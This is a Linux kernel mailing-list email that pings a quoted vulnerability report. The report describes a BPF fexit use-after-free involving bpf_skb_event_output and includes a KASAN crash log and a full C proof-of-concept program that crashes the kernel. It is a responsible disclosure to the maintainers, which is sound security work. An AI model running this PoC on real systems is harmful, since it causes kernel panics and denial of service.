Received: from zg8tmtyylji0my4xnjqumte4.icoremail.net (zg8tmtyylji0my4xnjqumte4.icoremail.net [162.243.164.118])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id BCE7535C193
	for <bpf@vger.kernel.org>; Tue, 21 Apr 2026 10:27:34 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.243.164.118
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1776767260; cv=none; b=hrG3uQjWMG0mCq2Ad4B6jTlI/NSFBn7V+EG/tesdrj/if462IorsyKMXXFKqzk52i9MYW4AAUxjMtTyRNR9n5dGW+xsAM7N1nt9w3Q7aTAaMYU3YQdw3LDWrRLp8rOxy7Qos2whhFp4S1vu970MyyO54AU4rfhiNBT59eILoFOA=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1776767260; c=relaxed/simple;
	bh=ECzxHhqXlBadCZJ6mikqcUCYqGaoSg4zH0ZNifnvIVY=;
	h=Message-ID:Date:MIME-Version:Subject:From:To:Cc:References:
	 In-Reply-To:Content-Type; b=eNYH2Kfe7h2bkSarx/gK0IYVmW86Pe8PKAZ0AySORWz0HV8VPogQeNP9Ryxsgbl80DRofi41AaxWCanj/+u4SHTKiTrczOB9/ZEkKGoA60yKy23m5s93vQSOUw6nRXBYycYeox0DCKRvLm0EBqoTbmncxalt5zbH/RQ7XjqRmEM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=std.uestc.edu.cn; spf=pass smtp.mailfrom=std.uestc.edu.cn; dkim=fail (0-bit key) header.d=std.uestc.edu.cn header.i=@std.uestc.edu.cn header.b=eP0FNHaK reason="key not found in DNS"; arc=none smtp.client-ip=162.243.164.118
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=std.uestc.edu.cn
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=std.uestc.edu.cn
Authentication-Results: smtp.subspace.kernel.org;
	dkim=fail reason="key not found in DNS" (0-bit key) header.d=std.uestc.edu.cn header.i=@std.uestc.edu.cn header.b="eP0FNHaK"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
	d=std.uestc.edu.cn; s=dkim; h=Received:Message-ID:Date:
	MIME-Version:User-Agent:Subject:From:To:Cc:References:
	In-Reply-To:Content-Type:Content-Transfer-Encoding; bh=SyE04ymKm
	XGeRcYEn3ACBc4A2y18uDRK0jhb+4IGdHo=; b=eP0FNHaKMiS05zsgd51cuOECU
	pXt5nksF5r+ru+HYGMhV3obko2wBY/0I/IavTZOhTnxkRj8cL6T/LobChKyOxUZZ
	w1NUltXfLOEtzt6MtkeQxUOCoGMr35IcbAE5Pz55EJV0FFhmxFxdNuDCwjvnjiAw
	xJVx8uhijMZl5G8ZSQ=
Received: from [IPV6:240c:c983:9:729a:c8ca:b305:7c36:ff7a] (unknown [240c:c983:9:729a:c8ca:b305:7c36:ff7a])
	by hzbj-edu-front-4.icoremail.net (Coremail) with SMTP id BrQMCkDGb7sMUedpFE2vAQ--.38968S3;
	Tue, 21 Apr 2026 18:27:26 +0800 (CST)
Message-ID: <561094f2-fd8b-4103-80e2-b44a51479e46@std.uestc.edu.cn>
Date: Tue, 21 Apr 2026 18:27:23 +0800
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: BPF tracing fexit argument lifetime mismatch leads to
 slab-use-after-free
From: Quan Sun <2022090917019@std.uestc.edu.cn>
To: daniel@iogearbox.net, bpf@vger.kernel.org
Cc: dddddd@hust.edu.cn, M202472210@hust.edu.cn, dzm91@hust.edu.cn,
 hust-os-kernel-patches@googlegroups.com
References: <9d61b891-2d52-42b9-bc1a-ad963ccb675d@std.uestc.edu.cn>
In-Reply-To: <9d61b891-2d52-42b9-bc1a-ad963ccb675d@std.uestc.edu.cn>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit
X-CM-TRANSID:BrQMCkDGb7sMUedpFE2vAQ--.38968S3
X-Coremail-Antispam: 1UD129KBjvAXoWfuFyrtF4rZr4fJw15uFW5Awb_yoW8tw17Jo
	Wqgw1rAr4rGw17GryfA34rXr45Gw1xXFnrKr1vkrsrWF4jg345J347Jryxtay7Xr4kWFyr
	A34rK3WDZa4kJr1kn29KB7ZKAUJUUUU8529EdanIXcx71UUUUU7v73VFW2AGmfu7bjvjm3
	AaLaJ3UjIYCTnIWjp_UUUYV7k0a2IF6F4UM7kC6x804xWl14x267AKxVW8JVW5JwAFc2x0
	x2IEx4CE42xK8VAvwI8IcIk0rVWrJVCq3wAFIxvE14AKwVWUJVWUGwA2ocxC64kIII0Yj4
	1l84x0c7CEw4AK67xGY2AK021l84ACjcxK6xIIjxv20xvE14v26r1j6r1xM28EF7xvwVC0
	I7IYx2IY6xkF7I0E14v26r1j6r4UM28EF7xvwVC2z280aVAFwI0_Cr1j6rxdM28EF7xvwV
	C2z280aVCY1x0267AKxVWxJr0_GcWlnxkEFVAIw20F6cxK64vIFxWle2I262IYc4CY6c8I
	j28IcVAaY2xG8wAqx4xG64xvF2IEw4CE5I8CrVC2j2WlYx0E2Ix0cI8IcVAFwI0_Jr0_Jr
	4lYx0Ex4A2jsIE14v26r1j6r4UMcvjeVCFs4IE7xkEbVWUJVW8JwACjcxG0xvEwIxGrwCY
	1x0262kKe7AKxVWUAVWUtwCF04k20xvY0x0EwIxGrwCFx2IqxVCFs4IE7xkEbVWUJVW8Jw
	C20s026c02F40E14v26r1j6r18MI8I3I0E7480Y4vE14v26r106r1rMI8E67AF67kF1VAF
	wI0_JF0_Jw1lIxkGc2Ij64vIr41lIxAIcVC0I7IYx2IY67AKxVWUJVWUCwCI42IY6xIIjx
	v20xvEc7CjxVAFwI0_Jr0_Gr1lIxAIcVCF04k26cxKx2IYs7xG6r1j6r1xMIIF0xvEx4A2
	jsIE14v26r1j6r4UMIIF0xvEx4A2jsIEc7CjxVAFwI0_Gr0_Gr1UYxBIdaVFxhVjvjDU0x
	ZFpf9x07jnPEfUUUUU=
X-CM-SenderInfo: asqsjiyzqzilqqrzq21wgo3vxvwfhvlgxou0/

On 2026/4/5 21:12, Quan Sun wrote:
> Our fuzzing found a slab-use-after-free vulnerability in the Linux 
> kernel BPF subsystem. The issue is triggered when a 
> `BPF_PROG_TYPE_TRACING` program with `BPF_TRACE_FEXIT` is attached to a 
> packet transmit path function, and the program calls 
> `bpf_skb_event_output()` on an `skb` argument that may already be freed 
> by the target function.
> 
> Reported-by: Quan Sun <2022090917019@std.uestc.edu.cn>
> Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
> Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
> Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>
> 
> ## Root Cause
> 
> This vulnerability is caused by a semantic gap between verifier 
> assumptions for tracing program arguments and runtime object lifetime.
> 
> 1. A tracing program is loaded as `BPF_PROG_TYPE_TRACING` with 
> `expected_attach_type = BPF_TRACE_FEXIT` and attached via BTF to a 
> network transmit path function.
> 2. At function exit (`fexit`), the BPF program reads the function 
> argument `skb` from tracing context and passes it to helper 
> `bpf_skb_event_output` (helper id 111).
> 3. Along the real execution path, the same `skb` can already be freed 
> (for example through `consume_skb` in transmit/forwarding paths) before 
> fexit trampoline invokes the BPF program.
> 4. `bpf_skb_event_output()` dereferences this stale pointer and performs 
> memory reads from a freed `sk_buff`, triggering `KASAN: slab-use-after- 
> free`.
> 
> So, the bug is not a simple helper misuse in userspace, but a lifetime 
> tracking issue: verifier-side type acceptance does not guarantee object 
> liveness at fexit execution time.

Hi,

Just a gentle ping on this report.

I understand the team is extremely busy, but I wanted to check if there 
are any updates or if this is still in the queue to be reviewed.
I am happy to provide more context or assist with testing a patch if needed.

Thank you for your time.

Best regards,
Quan Sun

> 
> #### Execution Flow Visualization
> 
> ```text
> Vulnerability Execution Flow
> |
> |--- 1. `bpf(BPF_PROG_LOAD, ...)` loads tracing program
> |    |
> |    `-- Program type: `BPF_PROG_TYPE_TRACING`
> |        Attach type: `BPF_TRACE_FEXIT`
> |        Program reads `skb` from tracing ctx and calls 
> `bpf_skb_event_output`
> |
> |--- 2. Program attachment via BTF
> |    |
> |    `-- Attach to network transmit-related function (e.g. 
> `neigh_connected_output` or `__dev_queue_xmit` path)
> |
> |--- 3. Runtime packet transmit path executes
> |    |
> |    `-- Target function may free skb (`consume_skb`) before function 
> returns
> |
> |--- 4. fexit trampoline invokes BPF program
> |    |
> |    `-- Program still uses original skb argument from ctx
> |        |
> |        `-> Passes stale skb pointer to `bpf_skb_event_output`
> |            |
> |            `-> helper dereferences freed object
> |                |
> |                `-> KASAN slab-use-after-free
> ```
> 
> ## Reproduction Steps
> 
> 1. Load a tracing fexit BPF program that:
> 
> - gets `skb` argument from tracing context,
> - prepares a small stack metadata buffer,
> - calls helper `bpf_skb_event_output(skb, perf_event_array_map, flags, 
> meta, size)`.
> 
> 2. Attach the program to a valid BTF function id in the packet transmit 
> path (the local PoC uses `BTF_ID = 174610`, corresponding to 
> `__dev_queue_xmit` in this build).
> 3. Trigger transmit path traffic (for example `ping -c 3 127.0.0.1`). 
> The execution of the program will cause the kernel to crash.
> 
> ## KASAN Report
> 
> ```text
> [   90.843619][ T9872] 
> ==================================================================
> [   90.844582][ T9872] BUG: KASAN: slab-use-after-free in 
> bpf_skb_event_output+0x111/0x120
> [   90.845545][ T9872] Read of size 4 at addr ff1100002362cbb0 by task 
> ping/9872
> [   90.846358][ T9872]
> [   90.846663][ T9872] CPU: 0 UID: 0 PID: 9872 Comm: ping Not tainted 
> 7.0.0-rc5-g6f6c794d0ff0 #5
> [   90.846682][ T9872] Hardware name: QEMU Standard PC (i440FX + PIIX, 
> 1996), BIOS 1.15.0-1 04/04
> [   90.846691][ T9872] Call Trace:
> [   90.846717][ T9872]  <TASK>
> [   90.846722][ T9872]  dump_stack_lvl+0x116/0x1b0
> [   90.846953][ T9872]  print_report+0xca/0x5f0
> [   90.847109][ T9872]  ? __phys_addr+0xf0/0x180
> [   90.847230][ T9872]  ? bpf_skb_event_output+0x111/0x120
> [   90.847248][ T9872]  ? bpf_skb_event_output+0x111/0x120
> [   90.847266][ T9872]  kasan_report+0xca/0x100
> [   90.847303][ T9872]  ? bpf_skb_event_output+0x111/0x120
> [   90.847324][ T9872]  bpf_skb_event_output+0x111/0x120
> [   90.847359][ T9872]  bpf_prog_eeb0967e70347227+0x51/0x5a
> [   90.847374][ T9872]  bpf_trampoline_6442626364+0x6c/0xdf
> [   90.847389][ T9872]  neigh_resolve_output+0x522/0x8f0
> [   90.847430][ T9872]  ip_finish_output2+0x7c9/0x1f90
> [   90.847513][ T9872]  ? ip_skb_dst_mtu+0x585/0xc60
> [   90.847549][ T9872]  ? __pfx_ip_finish_output2+0x10/0x10
> [   90.847568][ T9872]  __ip_finish_output+0x3b7/0x6c0
> [   90.847584][ T9872]  ip_finish_output+0x3a/0x380
> [   90.847600][ T9872]  ip_output+0x1e1/0x520
> [   90.847614][ T9872]  ? __pfx_ip_output+0x10/0x10
> [   90.847628][ T9872]  ip_push_pending_frames+0x2b9/0x320
> [   90.847646][ T9872]  raw_sendmsg+0x144b/0x33b0
> [   90.847695][ T9872]  ? aa_profile_af_perm+0x340/0x3a0
> [   90.847827][ T9872]  ? tomoyo_find_next_domain+0x14b0/0x20c0
> [   90.847872][ T9872]  ? __pfx_raw_sendmsg+0x10/0x10
> [   90.847890][ T9872]  ? tomoyo_check_inet_address+0x442/0x6b0
> [   90.847921][ T9872]  ? tomoyo_check_inet_address+0xe9/0x6b0
> [   90.847948][ T9872]  ? tomoyo_socket_sendmsg_permission+0x140/0x3a0
> [   90.847973][ T9872]  ? __pfx_raw_sendmsg+0x10/0x10
> [   90.847993][ T9872]  ? __pfx_inet_sendmsg+0x10/0x10
> [   90.848022][ T9872]  inet_sendmsg+0x126/0x150
> [   90.848041][ T9872]  __sys_sendto+0x46b/0x500
> [   90.848077][ T9872]  ? __pfx___sys_sendto+0x10/0x10
> [   90.848096][ T9872]  ? count_memcg_events_mm.constprop.0+0xfa/0x2a0
> [   90.848174][ T9872]  ? exc_page_fault+0xbe/0x170
> [   90.848252][ T9872]  __x64_sys_sendto+0xe5/0x1c0
> [   90.848269][ T9872]  ? lockdep_hardirqs_on+0x7c/0x110
> [   90.848293][ T9872]  do_syscall_64+0x11b/0xf80
> [   90.848319][ T9872]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [   90.848364][ T9872] RIP: 0033:0x7f731c0e1c63
> [   90.848387][ T9872] Code: 8b 15 a1 71 0c 00 f7 d8 64 89 02 48 c7 c0 
> ff ff ff ff eb b8 0f 1f 04
> [   90.848402][ T9872] RSP: 002b:00007ffe0abaf248 EFLAGS: 00000202 
> ORIG_RAX: 000000000000002c
> [   90.848439][ T9872] RAX: ffffffffffffffda RBX: 00005588f81bf340 RCX: 
> 00007f731c0e1c63
> [   90.848449][ T9872] RDX: 0000000000000040 RSI: 00005588fd7d1ce0 RDI: 
> 0000000000000003
> [   90.848459][ T9872] RBP: 00005588fd7d1ce0 R08: 00005588f81c15c0 R09: 
> 0000000000000010
> [   90.848469][ T9872] R10: 0000000000000000 R11: 0000000000000202 R12: 
> 0000000000000040
> [   90.848478][ T9872] R13: 00007ffe0abb0930 R14: 0000001d00000001 R15: 
> 00005588f81c2680
> [   90.848496][ T9872]  </TASK>
> [   90.848501][ T9872]
> [   90.882292][ T9872] Allocated by task 9872:
> [   90.882805][ T9872]  kasan_save_stack+0x24/0x50
> [   90.883378][ T9872]  kasan_save_track+0x14/0x30
> [   90.883946][ T9872]  __kasan_slab_alloc+0x87/0x90
> [   90.884543][ T9872]  kmem_cache_alloc_node_noprof+0x266/0x6e0
> [   90.885295][ T9872]  __alloc_skb+0x151/0x740
> [   90.885860][ T9872]  __ip_append_data+0x34b4/0x4170
> [   90.886461][ T9872]  ip_append_data+0x11a/0x1a0
> [   90.887019][ T9872]  raw_sendmsg+0xc00/0x33b0
> [   90.887573][ T9872]  inet_sendmsg+0x126/0x150
> [   90.888116][ T9872]  __sys_sendto+0x46b/0x500
> [   90.888662][ T9872]  __x64_sys_sendto+0xe5/0x1c0
> [   90.889236][ T9872]  do_syscall_64+0x11b/0xf80
> [   90.889818][ T9872]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [   90.890518][ T9872]
> [   90.890798][ T9872] Freed by task 9872:
> [   90.891279][ T9872]  kasan_save_stack+0x24/0x50
> [   90.891845][ T9872]  kasan_save_track+0x14/0x30
> [   90.892418][ T9872]  kasan_save_free_info+0x3b/0x60
> [   90.893015][ T9872]  __kasan_slab_free+0x61/0x80
> [   90.893594][ T9872]  kmem_cache_free+0x13e/0x6d0
> [   90.894165][ T9872]  kfree_skbmem+0x18f/0x1f0
> [   90.894747][ T9872]  consume_skb+0xd1/0x100
> [   90.895273][ T9872]  icmp_rcv+0xa72/0x1120
> [   90.895796][ T9872]  ip_protocol_deliver_rcu+0x44f/0x4d0
> [   90.896457][ T9872]  ip_local_deliver_finish+0x3d3/0x720
> [   90.897106][ T9872]  ip_local_deliver+0x19f/0x200
> [   90.897696][ T9872]  ip_rcv+0x32c/0x3e0
> [   90.898194][ T9872]  __netif_receive_skb_one_core+0x19e/0x1f0
> [   90.898889][ T9872]  __netif_receive_skb+0x22/0x160
> [   90.899493][ T9872]  process_backlog+0x387/0x1540
> [   90.900088][ T9872]  __napi_poll.constprop.0+0xb8/0x540
> [   90.900737][ T9872]  net_rx_action+0x9b6/0xea0
> [   90.901294][ T9872]  handle_softirqs+0x1d8/0x9b0
> [   90.901945][ T9872]  do_softirq+0xb1/0xe0
> [   90.902462][ T9872]  __local_bh_enable_ip+0x105/0x130
> [   90.903082][ T9872]  __dev_queue_xmit+0x108f/0x43c0
> [   90.903687][ T9872]  bpf_trampoline_6442626364+0x39/0xdf
> [   90.904335][ T9872]  neigh_resolve_output+0x522/0x8f0
> [   90.904958][ T9872]  ip_finish_output2+0x7c9/0x1f90
> [   90.905559][ T9872]  __ip_finish_output+0x3b7/0x6c0
> [   90.906152][ T9872]  ip_finish_output+0x3a/0x380
> [   90.906722][ T9872]  ip_output+0x1e1/0x520
> [   90.907236][ T9872]  ip_push_pending_frames+0x2b9/0x320
> [   90.907867][ T9872]  raw_sendmsg+0x144b/0x33b0
> [   90.908427][ T9872]  inet_sendmsg+0x126/0x150
> [   90.908969][ T9872]  __sys_sendto+0x46b/0x500
> [   90.909570][ T9872]  __x64_sys_sendto+0xe5/0x1c0
> [   90.910136][ T9872]  do_syscall_64+0x11b/0xf80
> [   90.910701][ T9872]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [   90.911406][ T9872]
> [   90.911689][ T9872] The buggy address belongs to the object at 
> ff1100002362cb40
> [   90.911689][ T9872]  which belongs to the cache skbuff_head_cache of 
> size 240
> [   90.913366][ T9872] The buggy address is located 112 bytes inside of
> [   90.913366][ T9872]  freed 240-byte region [ff1100002362cb40, 
> ff1100002362cc30)
> [   90.914933][ T9872]
> [   90.915229][ T9872] The buggy address belongs to the physical page:
> [   90.915967][ T9872] page: refcount:0 mapcount:0 
> mapping:0000000000000000 index:0xff1100002362c
> [   90.917148][ T9872] memcg:ff1100001eb1e601
> [   90.917651][ T9872] flags: 0xfff00000000200(workingset|node=0|zone=1| 
> lastcpupid=0x7ff)
> [   90.918601][ T9872] page_type: f5(slab)
> [   90.919075][ T9872] raw: 00fff00000000200 ff1100001c522b40 
> ffd4000000930fd0 ffd400000097a850
> [   90.920114][ T9872] raw: ff1100002362cdc0 00000008000c000a 
> 00000000f5000000 ff1100001eb1e601
> [   90.921120][ T9872] page dumped because: kasan: bad access detected
> [   90.921882][ T9872] page_owner tracks the page as allocated
> [   90.922561][ T9872] page last allocated via order 0, migratetype 
> Unmovable, gfp_mask 0xd2cc0(1
> [   90.924894][ T9872]  post_alloc_hook+0x134/0x160
> [   90.925493][ T9872]  get_page_from_freelist+0xded/0x2ae0
> [   90.926139][ T9872]  __alloc_frozen_pages_noprof+0x269/0x27e0
> [   90.926839][ T9872]  new_slab+0xab/0x6b0
> [   90.927327][ T9872]  refill_objects+0x25b/0x3f0
> [   90.927885][ T9872]  __pcs_replace_empty_main+0x1b6/0x690
> [   90.928545][ T9872]  kmem_cache_alloc_node_noprof+0x4dc/0x6e0
> [   90.929250][ T9872]  __alloc_skb+0x151/0x740
> [   90.929780][ T9872]  alloc_uevent_skb+0x82/0x220
> [   90.930367][ T9872]  kobject_uevent_env+0xcd4/0x17b0
> [   90.930972][ T9872]  kobject_synth_uevent+0x775/0x860
> [   90.931592][ T9872]  uevent_store+0x4b/0xa0
> [   90.932218][ T9872]  drv_attr_store+0x79/0xb0
> [   90.932763][ T9872]  sysfs_kf_write+0xf4/0x150
> [   90.933388][ T9872]  kernfs_fop_write_iter+0x3ac/0x580
> [   90.934031][ T9872]  vfs_write+0xc12/0x1180
> [   90.934598][ T9872] page last free pid 113 tgid 113 stack trace:
> [   90.935342][ T9872]  __free_frozen_pages+0x7ff/0x10a0
> [   90.935985][ T9872]  vfree+0x238/0xb50
> [   90.936502][ T9872]  delayed_vfree_work+0x5c/0x80
> [   90.937089][ T9872]  process_one_work+0x9e3/0x1c60
> [   90.937699][ T9872]  worker_thread+0x698/0xeb0
> [   90.938285][ T9872]  kthread+0x392/0x4a0
> [   90.938804][ T9872]  ret_from_fork+0xb37/0xde0
> [   90.939404][ T9872]  ret_from_fork_asm+0x1a/0x30
> [   90.940008][ T9872]
> [   90.940296][ T9872] Memory state around the buggy address:
> [   90.940946][ T9872]  ff1100002362ca80: fb fb fb fb fb fb fb fb fb fb 
> fb fb fb fb fc fc
> [   90.941878][ T9872]  ff1100002362cb00: fc fc fc fc fc fc fc fc fa fb 
> fb fb fb fb fb fb
> [   90.942807][ T9872] >ff1100002362cb80: fb fb fb fb fb fb fb fb fb fb 
> fb fb fb fb fb fb
> [   90.943733][ T9872]                                      ^
> [   90.944394][ T9872]  ff1100002362cc00: fb fb fb fb fb fb fc fc fc fc 
> fc fc fc fc fc fc
> [   90.945321][ T9872]  ff1100002362cc80: fa fb fb fb fb fb fb fb fb fb 
> fb fb fb fb fb fb
> [   90.946247][ T9872] 
> ==================================================================
> [   90.955572][ T9872] Kernel panic - not syncing: KASAN: panic_on_warn 
> set ...
> [   90.956461][ T9872] CPU: 0 UID: 0 PID: 9872 Comm: ping Not tainted 
> 7.0.0-rc5-g6f6c794d0ff0 #5
> [   90.957630][ T9872] Hardware name: QEMU Standard PC (i440FX + PIIX, 
> 1996), BIOS 1.15.0-1 04/04
> [   90.958676][ T9872] Call Trace:
> [   90.959065][ T9872]  <TASK>
> [   90.959418][ T9872]  dump_stack_lvl+0x3d/0x1b0
> [   90.959984][ T9872]  vpanic+0x7f7/0xa80
> [   90.960466][ T9872]  ? __pfx_vpanic+0x10/0x10
> [   90.961010][ T9872]  panic+0xc7/0xd0
> [   90.961475][ T9872]  ? __pfx_panic+0x10/0x10
> [   90.962008][ T9872]  ? preempt_schedule_common+0x44/0xb0
> [   90.962697][ T9872]  ? bpf_skb_event_output+0x111/0x120
> [   90.963338][ T9872]  ? preempt_schedule_thunk+0x16/0x30
> [   90.964000][ T9872]  ? check_panic_on_warn+0x24/0xc0
> [   90.964613][ T9872]  ? bpf_skb_event_output+0x111/0x120
> [   90.965267][ T9872]  check_panic_on_warn+0xb6/0xc0
> [   90.965856][ T9872]  ? bpf_skb_event_output+0x111/0x120
> [   90.966506][ T9872]  end_report+0x142/0x190
> [   90.967034][ T9872]  ? bpf_skb_event_output+0x111/0x120
> [   90.967680][ T9872]  kasan_report+0xd8/0x100
> [   90.968234][ T9872]  ? bpf_skb_event_output+0x111/0x120
> [   90.968873][ T9872]  bpf_skb_event_output+0x111/0x120
> [   90.969515][ T9872]  bpf_prog_eeb0967e70347227+0x51/0x5a
> [   90.970158][ T9872]  bpf_trampoline_6442626364+0x6c/0xdf
> [   90.970814][ T9872]  neigh_resolve_output+0x522/0x8f0
> [   90.971466][ T9872]  ip_finish_output2+0x7c9/0x1f90
> [   90.972067][ T9872]  ? ip_skb_dst_mtu+0x585/0xc60
> [   90.972673][ T9872]  ? __pfx_ip_finish_output2+0x10/0x10
> [   90.973332][ T9872]  __ip_finish_output+0x3b7/0x6c0
> [   90.973939][ T9872]  ip_finish_output+0x3a/0x380
> [   90.974516][ T9872]  ip_output+0x1e1/0x520
> [   90.975021][ T9872]  ? __pfx_ip_output+0x10/0x10
> [   90.975588][ T9872]  ip_push_pending_frames+0x2b9/0x320
> [   90.976227][ T9872]  raw_sendmsg+0x144b/0x33b0
> [   90.976792][ T9872]  ? aa_profile_af_perm+0x340/0x3a0
> [   90.977439][ T9872]  ? tomoyo_find_next_domain+0x14b0/0x20c0
> [   90.978133][ T9872]  ? __pfx_raw_sendmsg+0x10/0x10
> [   90.978734][ T9872]  ? tomoyo_check_inet_address+0x442/0x6b0
> [   90.979426][ T9872]  ? tomoyo_check_inet_address+0xe9/0x6b0
> [   90.980107][ T9872]  ? tomoyo_socket_sendmsg_permission+0x140/0x3a0
> [   90.980889][ T9872]  ? __pfx_raw_sendmsg+0x10/0x10
> [   90.981486][ T9872]  ? __pfx_inet_sendmsg+0x10/0x10
> [   90.982087][ T9872]  inet_sendmsg+0x126/0x150
> [   90.982642][ T9872]  __sys_sendto+0x46b/0x500
> [   90.983188][ T9872]  ? __pfx___sys_sendto+0x10/0x10
> [   90.983786][ T9872]  ? count_memcg_events_mm.constprop.0+0xfa/0x2a0
> [   90.984592][ T9872]  ? exc_page_fault+0xbe/0x170
> [   90.985195][ T9872]  __x64_sys_sendto+0xe5/0x1c0
> [   90.985762][ T9872]  ? lockdep_hardirqs_on+0x7c/0x110
> [   90.986400][ T9872]  do_syscall_64+0x11b/0xf80
> [   90.986962][ T9872]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [   90.987664][ T9872] RIP: 0033:0x7f731c0e1c63
> [   90.988198][ T9872] Code: 8b 15 a1 71 0c 00 f7 d8 64 89 02 48 c7 c0 
> ff ff ff ff eb b8 0f 1f 04
> [   90.990426][ T9872] RSP: 002b:00007ffe0abaf248 EFLAGS: 00000202 
> ORIG_RAX: 000000000000002c
> [   90.991406][ T9872] RAX: ffffffffffffffda RBX: 00005588f81bf340 RCX: 
> 00007f731c0e1c63
> [   90.992325][ T9872] RDX: 0000000000000040 RSI: 00005588fd7d1ce0 RDI: 
> 0000000000000003
> [   90.993247][ T9872] RBP: 00005588fd7d1ce0 R08: 00005588f81c15c0 R09: 
> 0000000000000010
> [   90.994165][ T9872] R10: 0000000000000000 R11: 0000000000000202 R12: 
> 0000000000000040
> [   90.995093][ T9872] R13: 00007ffe0abb0930 R14: 0000001d00000001 R15: 
> 00005588f81c2680
> [   90.996022][ T9872]  </TASK>
> [   90.996515][ T9872] Kernel Offset: disabled
> [   90.997022][ T9872] Rebooting in 86400 seconds..
> ```
> 
> ## Proof of Concept
> 
> The following C program demonstrates the slab-use-after-free read 
> vulnerability on latest bpf-next(commit 
> 6f6c794d0ff05dab1fa4677f39043de8a6a80da3)
> 
> ### How BTF_ID is obtained
> 
> The PoC uses `BPF_TRACE_FEXIT`, so `attach_btf_id` must be the function 
> BTF id from the exact running kernel image (the `vmlinux` used by the 
> VM). In this report, `BTF_ID = 174610` maps to `__dev_queue_xmit`.
> 
> You can get it with:
> 
> ```bash
> bpftool btf dump file /path/to/vmlinux | grep "FUNC '__dev_queue_xmit'"
> ```
> 
> Example output:
> 
> ```text
> [174610] FUNC '__dev_queue_xmit' type_id=21195 linkage=static
> ```
> 
> Note: BTF IDs are build-specific. If kernel source/config/compiler 
> changes, this ID may change and must be re-queried.
> 
> ```c
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <fcntl.h>
> #include <stdint.h>
> #include <sys/syscall.h>
> #include <linux/bpf.h>
> 
> #define BTF_ID 174610
> 
> int bpf(int cmd, union bpf_attr *attr, unsigned int size) {
>      return syscall(__NR_bpf, cmd, attr, size);
> }
> 
> int main() {
>      union bpf_attr attr = {0};
>      attr.map_type = BPF_MAP_TYPE_PERF_EVENT_ARRAY;
>      attr.key_size = 4;
>      attr.value_size = 4;
>      attr.max_entries = 4;
>      int map_fd = bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
>      if (map_fd < 0) { perror("BPF_MAP_CREATE"); return 1; }
> 
>      struct bpf_insn insns[] = {
>          {0x79, 6, 1, 0, 0},             // r6 = *(u64 *)(r1 + 0)  // 
> ctx[0], the skb
>          {0x18, 2, BPF_PSEUDO_MAP_FD, 0, map_fd},        // r2 = map_fd
>          {0x00, 0, 0, 0, 0},
>          {0xb7, 3, 0, 0, 0},             // r3 = 0 (flags)
>          {0xb7, 5, 0, 0, 16},            // r5 = 16 (meta_size)
>          {0xbf, 4, 10, 0, 0},            // r4 = r10
>          {0x07, 4, 0, 0, -16},           // r4 -= 16
>          {0x7a, 10, 0, -16, 0x11223344}, // *(u64 *)(fp - 16) = 0x11223344
>          {0x7a, 10, 0, -8,  0x55667788}, // *(u64 *)(fp - 8)  = 0x55667788
>          {0xbf, 1, 6, 0, 0},             // r1 = r6 (skb)
>          {0x85, 0, 0, 0, 111},           // call bpf_skb_event_output
>          {0xb7, 0, 0, 0, 0},             // r0 = 0
>          {0x95, 0, 0, 0, 0}              // exit
>      };
> 
>      char log_buf[65536] = {0};
>      union bpf_attr prog_attr = {0};
>      prog_attr.prog_type = BPF_PROG_TYPE_TRACING;
>      prog_attr.expected_attach_type = BPF_TRACE_FEXIT;
>      prog_attr.insns = (uint64_t)insns;
>      prog_attr.insn_cnt = sizeof(insns) / sizeof(insns[0]);
>      prog_attr.license = (uint64_t)"GPL";
>      prog_attr.attach_btf_id = BTF_ID;
>      prog_attr.log_buf = (uint64_t)log_buf;
>      prog_attr.log_size = sizeof(log_buf);
>      prog_attr.log_level = 1;
> 
>      int prog_fd = bpf(BPF_PROG_LOAD, &prog_attr, sizeof(prog_attr));
>      if (prog_fd < 0) {
>          perror("BPF_PROG_LOAD");
>          printf("log:\n%s\n", log_buf);
>          return 1;
>      }
> 
>      union bpf_attr raw_attr = {0};
>      //raw_attr.target_fd = 0;
>      raw_attr.raw_tracepoint.name = 0;
>      raw_attr.raw_tracepoint.prog_fd = prog_fd;
>      int link_fd = bpf(BPF_RAW_TRACEPOINT_OPEN, &raw_attr, 
> sizeof(raw_attr));
>      if (link_fd < 0) { perror("BPF_RAW_TRACEPOINT_OPEN"); return 1; }
> 
>      printf("Loaded and attached to __dev_queue_xmit!\n");
>      // Trigger the flow
>      system("ping -c 3 127.0.0.1 > /dev/null");
> 
>      return 0;
> }
> ```
> 
> ## Kernel Configuration Requirements for Reproduction
> 
> The vulnerability can be triggered with the kernel config in the attachment.

